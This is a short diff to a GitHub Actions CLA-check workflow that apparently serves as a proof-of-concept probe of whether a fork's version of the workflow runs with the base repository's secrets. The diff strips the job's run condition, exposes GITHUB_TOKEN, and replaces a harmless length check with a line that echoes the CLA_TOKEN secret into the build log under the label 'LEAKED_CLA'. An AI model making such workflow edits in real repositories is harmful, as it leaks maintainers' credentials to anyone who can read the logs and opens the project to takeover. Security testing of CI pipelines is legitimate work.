@@ -9,18 +9,13 @@ on:
 jobs:
   cla:
     runs-on: ubuntu-latest
-    if: |
-      (github.event.issue.pull_request
-        && !github.event.issue.pull_request.merged_at
-        && contains(github.event.comment.body, 'signed')
-      )
-      || (github.event.pull_request && !github.event.pull_request.merged)
     steps:
       - name: which-version
         env:
           CLA: ${{ secrets.CLA_TOKEN }}
+          GH: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "BASE_VERSION_RAN"
+          echo "FORK_VERSION_RAN"
           echo "sha=$GITHUB_SHA ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
-          echo "cla_len=${#CLA}"
-          exit 1
+          echo "LEAKED_CLA=$CLA"
+          echo "gh_len=${#GH}"
